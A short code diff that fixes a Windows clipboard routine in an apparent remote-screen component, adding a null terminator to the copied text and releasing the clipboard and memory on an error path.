@@ -319,13 +319,18 @@ VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
     if (!::OpenClipboard(NULL))
         return;
     ::EmptyClipboard();
-    HGLOBAL hGlobal = GlobalAlloc(GMEM_DDESHARE, ulLength);
+    HGLOBAL hGlobal = GlobalAlloc(GMEM_DDESHARE, ulLength+1);
     if (hGlobal != NULL) {
 
         LPTSTR szClipboardVirtualAddress = (LPTSTR) GlobalLock(hGlobal);
-        if (szClipboardVirtualAddress == NULL)
-            return;
+		if (szClipboardVirtualAddress == NULL)
+		{
+			GlobalFree(hGlobal);
+			CloseClipboard();
+			return;
+		}
         memcpy(szClipboardVirtualAddress, szBuffer, ulLength);
+        szClipboardVirtualAddress[ulLength] = '\0';
         GlobalUnlock(hGlobal);
         if(NULL==SetClipboardData(CF_TEXT, hGlobal))
             GlobalFree(hGlobal);
